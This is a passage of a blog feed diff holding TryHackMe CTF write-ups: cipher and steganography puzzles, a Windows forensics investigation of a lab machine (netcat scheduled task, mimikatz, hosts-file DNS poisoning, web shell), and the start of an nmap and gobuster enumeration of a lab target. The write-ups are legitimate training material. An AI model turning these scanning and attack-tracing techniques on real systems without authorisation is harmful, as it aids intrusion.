LS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0=&lt;&#x2F;h3&gt;
+&lt;p&gt;This contains multiple ciphers namely &lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Cipher 1: Base64, Because there is &lt;code&gt;=&lt;&#x2F;code&gt; at last. After decoding we got morse code of format &lt;code&gt;----- .---- .----&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;Cipher 2: Morse code, After using morse code encoding we get binary data.&lt;&#x2F;li&gt;
+&lt;li&gt;Cipher 3: Binary to ASCII, after convering we got data like &lt;code&gt;fe &lt;&#x2F;code&gt;_&lt;code&gt;``e&lt;&#x2F;code&gt;, which is in ROt47 format&lt;&#x2F;li&gt;
+&lt;li&gt;Cipher 4: ROT 47, we got &lt;code&gt;76 101 116 39 115 32 109 97 107 101 32 116 104 105 115 32 97 32 98 105 116 32 116 114 105 99 107 105 101 114 46 46 46&lt;&#x2F;code&gt;, which is in binary coded decimal format.&lt;&#x2F;li&gt;
+&lt;li&gt;Cipher 5: BCD to ASCI, finally we got the flag. This is &lt;code&gt;Let&#x27;s make th********************&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;task-2-spectrograms&quot;&gt;Task 2. Spectrograms&lt;&#x2F;h2&gt;
+&lt;p&gt;We downloaded the task file. As there mention, spectrogram is a visual representation of the spectrum of frequencies of a signal as it varies with time. &lt;&#x2F;p&gt;
+&lt;p&gt;We can simply use audio visualization tool like audacity to make this possible. &lt;&#x2F;p&gt;
+&lt;p&gt;After opening file in audacity, right click on file and change option from &lt;code&gt;Waveform to Spectrogram&lt;&#x2F;code&gt;, there we got the flag.
+And this is &lt;code&gt;super ****** *******&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;task-3-steganography&quot;&gt;Task 3. Steganography&lt;&#x2F;h2&gt;
+&lt;p&gt;Steganography is the practice of concealing a file, message, image, or video within another file, message, image, or video.&lt;&#x2F;p&gt;
+&lt;p&gt;Here also need to download the task file which is a jpg file and need to revel the infromation.&lt;&#x2F;p&gt;
+&lt;p&gt;It seems there is a text file embeeded. Here we used the tool &lt;code&gt;steghide&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+steghide --info stegosteg_1559008553457.jpg
+&quot;stegosteg_1559008553457.jpg&quot;:
+  format: jpeg
+  capacity: 2.5 KB
+Try to get information about embedded data ? (y&#x2F;n) y
+Enter passphrase: 
+  embedded file &quot;steganopayload2248.txt&quot;:
+    size: 13.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+&lt;&#x2F;pre&gt;
+&lt;p&gt;From above result we can see that, passphrase is asked but this is not required so we can just ignore this. &lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ steghide --extract -sf stegosteg_1559008553457.jpg
+Enter passphrase: 
+wrote extracted data to &quot;steganopayload2248.txt&quot;.
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we have the txt file and there is flag, &lt;code&gt;Spa**********&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;task-4-security-through-obscurity&quot;&gt;Task 4. Security through obscurity&lt;&#x2F;h2&gt;
+&lt;p&gt;Security through obscurity is the reliance in security engineering on the secrecy of the design or implementation as the main method of providing security for a system or component of a system.&lt;&#x2F;p&gt;
+&lt;p&gt;There is also the file, first need to download and do all required activity.&lt;&#x2F;p&gt;
+&lt;p&gt;Current filename and extension is &lt;code&gt;meme_1559010886025.jpg&lt;&#x2F;code&gt;, but we need to find out first filename and extension.&lt;&#x2F;p&gt;
+&lt;p&gt;We use this command &lt;code&gt;strings meme_1559010886025.jpg&lt;&#x2F;code&gt; and got the first answer as &lt;code&gt;hac*******.png&lt;&#x2F;code&gt; at last.&lt;&#x2F;p&gt;
+&lt;p&gt;One line above this line we have the message, which is &lt;code&gt;AHH_YO**********!&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;This Challenge provides diverse field of cryptograpic problems. Which is really good to know.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Investigating Windows - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/investigating-windows/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/investigating-windows/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;investigating_windows.png&quot; alt=&quot;Investigating Windows&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;A windows machine has been hacked, its your job to go investigate this windows machine and find clues to what the hacker might have done.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;p&gt;Target IP: 10.10.99.65&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;1-version-and-year-of-windows-machine&quot;&gt;1. Version and year of windows machine&lt;&#x2F;h3&gt;
+&lt;p&gt;This can be found easily through properties. Also there is command &lt;code&gt;Get-ComputerInfo -Property &amp;quot;Os*&amp;quot;&lt;&#x2F;code&gt; for powershell to get inforation. This is Windows S***** 20**&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;2-last-user-logged-in&quot;&gt;2. Last user logged in&lt;&#x2F;h3&gt;
+&lt;p&gt;First need to get all the users through &lt;code&gt;Get-LocalUser&lt;&#x2F;code&gt;, we get&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Name           Enabled Description
+----           ------- -----------
+Administrator  True    Built-in account for administering the computer&#x2F;domain
+DefaultAccount False   A user account managed by the system.
+Guest          True    Built-in account for guest access to the computer&#x2F;domain
+Jenny          True
+John           True
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now need to check the last login of each user, and found result as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;investigating-windows&#x2F;last_logon.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;3-when-did-john-log-onto-the-system-last&quot;&gt;3. When did John log onto the system last?&lt;&#x2F;h3&gt;
+&lt;p&gt;We already have this answer in above question&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;4-what-ip-does-the-system-connect-to-when-it-first-starts&quot;&gt;4. What IP does the system connect to when it first starts?&lt;&#x2F;h3&gt;
+&lt;p&gt;We need to check system startup connection by using registry editor.&lt;&#x2F;p&gt;
+&lt;p&gt;The IP is found in path &lt;code&gt;HKEY_LOCAL_MACHINE &amp;gt; SOFTWARE &amp;gt; Microsoft &amp;gt; Windows &amp;gt; CurrentVersion &amp;gt; Run&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;5-what-two-accounts-had-administrative-privileges-other-than-the-administrator-user&quot;&gt;5. What two accounts had administrative privileges (other than the Administrator user)?&lt;&#x2F;h3&gt;
+&lt;p&gt;We need to find out the user, that are the group member of group &lt;code&gt;Administrators&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;investigating-windows&#x2F;admin_privileges.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;6-whats-the-name-of-the-scheduled-task-that-is-malicous&quot;&gt;6. Whats the name of the scheduled task that is malicous.&lt;&#x2F;h3&gt;
+&lt;p&gt;Schedule task can be get using command &lt;code&gt;Get-ScheduledTask&lt;&#x2F;code&gt;. Now looking into taskpath &lt;code&gt;\&lt;&#x2F;code&gt;, we have only 6 tasks. By analyzing one task &lt;code&gt;Clean **** ******&lt;&#x2F;code&gt; seems to be malicious.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;7-what-file-was-the-task-trying-to-run-daily&quot;&gt;7. What file was the task trying to run daily?&lt;&#x2F;h3&gt;
+&lt;p&gt;Need to find out the action done by this task. We can find out malicious binaries.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$task = Get-ScheduledTask | Where TaskName -EQ &quot;Clean **** ******&quot;
+$task.Actions
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Then we get the binary in Execute variable.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;8-what-port-did-this-file-listen-locally-for&quot;&gt;8. What port did this file listen locally for?&lt;&#x2F;h3&gt;
+&lt;p&gt;As the file is using netcat, looking into the argument variable we have the port number &lt;code&gt;13**&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;9-when-did-jenny-last-logon&quot;&gt;9. When did Jenny last logon?&lt;&#x2F;h3&gt;
+&lt;p&gt;We already have the answer.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;10-at-what-date-did-the-compromise-take-place&quot;&gt;10. At what date did the compromise take place?&lt;&#x2F;h3&gt;
+&lt;p&gt;This is the malicious file creation date, look into the file properties of above executable file.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;11-during-the-compromise-at-what-time-did-windows-first-assign-special-privileges-to-a-new-logon&quot;&gt;11. During the compromise, at what time did Windows first assign special privileges to a new logon?&lt;&#x2F;h3&gt;
+&lt;p&gt;Need to look into event viewer, of the file created date. Then looking into security log of that day. Open &lt;code&gt;Event Viewer&lt;&#x2F;code&gt; application and apply filter&#x2F;search. There from last, look for Task Category &lt;code&gt;Security Group Management&lt;&#x2F;code&gt; and we got the date and time.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;investigating-windows&#x2F;event_viewer.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;12-what-tool-was-used-to-get-windows-passwords&quot;&gt;12. What tool was used to get Windows passwords?&lt;&#x2F;h3&gt;
+&lt;p&gt;By looking into TMP directory, we can findout the tool and it is &lt;code&gt;mimi****&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;13-what-was-the-attackers-external-control-and-command-servers-ip&quot;&gt;13. What was the attackers external control and command servers IP?&lt;&#x2F;h3&gt;
+&lt;p&gt;Also known as C2 server, used to control the attacker machine from remote area. Need to look into hosts file which is found in the location &lt;code&gt;C:\Windows\System32\drivers\etc&lt;&#x2F;code&gt;. At last of the file we got the IP address, wher edomain is set to goodle.com&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;14-what-was-the-extension-name-of-the-shell-uploaded-via-the-servers-website&quot;&gt;14. What was the extension name of the shell uploaded via the servers website?&lt;&#x2F;h3&gt;
+&lt;p&gt;Shell should be uploaded via web, so need to look into webroot directory. Lets look into wwwroot dir.
+This is in location &lt;code&gt;C:\inetpub\wwwroot&lt;&#x2F;code&gt;. The extension is found there.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;15-what-was-the-last-port-the-attacker-opened&quot;&gt;15. What was the last port the attacker opened?&lt;&#x2F;h3&gt;
+&lt;p&gt;The port should be open for communication and can be found in firewall rule. Lets look into firewall configuration.&lt;&#x2F;p&gt;
+&lt;p&gt;Inside Inbound Rules, there is a rule name &lt;code&gt;Allow outside connection for development&lt;&#x2F;code&gt;, looking into Protocols and Ports, we have the port opened by attacker as &lt;code&gt;13**&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;h3 id=&quot;16-check-for-dns-poisoning-what-site-was-targeted&quot;&gt;16. Check for DNS poisoning, what site was targeted?&lt;&#x2F;h3&gt;
+&lt;p&gt;We already have this answer in the hosts file, which is the domain name pointing to the attacker IP.&lt;&#x2F;p&gt;
+&lt;p&gt;This CTF covered the simple forensics of a compromised windows server and backtrace to the attacker.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Overpass - TryHackMe Writup</title>
+        <published>2024-10-23T00:00:00+00:00</published>
+        <updated>2024-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/overpass/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/overpass/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;overpass.png&quot; alt=&quot;overpass&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;What happens when some broke CompSci students make a password manager?&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP address: 10.10.4.48&lt;&#x2F;p&gt;
+&lt;p&gt;Two ports are open.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nmap -sV 10.10.4.48 -v
+
+PORT      STATE    SERVICE VERSION
+22&#x2F;tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp    open     http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)
+10628&#x2F;tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Okay, now starting by searching directories using gobuster as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ gobuster dir -u http:&#x2F;&#x2F;10.10.4.48&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http:&#x2F;&#x2F;10.10.4.48&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+&#x2F;img                  (Status: 301) [Size: 0] [--&gt; img&#x2F;]
